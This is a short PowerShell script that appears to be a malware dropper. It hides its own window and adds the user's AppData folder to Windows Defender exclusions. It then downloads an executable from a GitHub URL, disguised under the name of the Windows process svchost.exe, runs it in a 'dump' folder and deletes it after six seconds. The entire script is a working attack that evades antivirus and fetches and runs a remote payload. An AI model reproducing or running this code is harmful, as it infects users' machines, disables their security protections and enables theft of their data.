$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) 
#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\dump"
Set-Location "$env:appdata\dump"
#Downloading and executing sv.exe
Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/svchost.exe" -OutFile "$env:appdata\dump\sv.exe"
./sv.exe
Start-Sleep -Seconds 6
Remove-Item -Path "$env:appdata\dump\sv.exe" -Force
